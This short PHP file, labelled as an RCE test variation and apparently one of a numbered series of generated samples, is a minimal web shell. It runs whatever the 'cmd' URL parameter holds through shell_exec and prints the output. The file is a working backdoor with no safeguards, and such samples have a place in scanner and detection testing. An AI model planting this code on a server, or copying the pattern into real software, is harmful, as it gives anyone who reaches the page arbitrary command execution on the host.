<?php
// RCE test variation #505
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>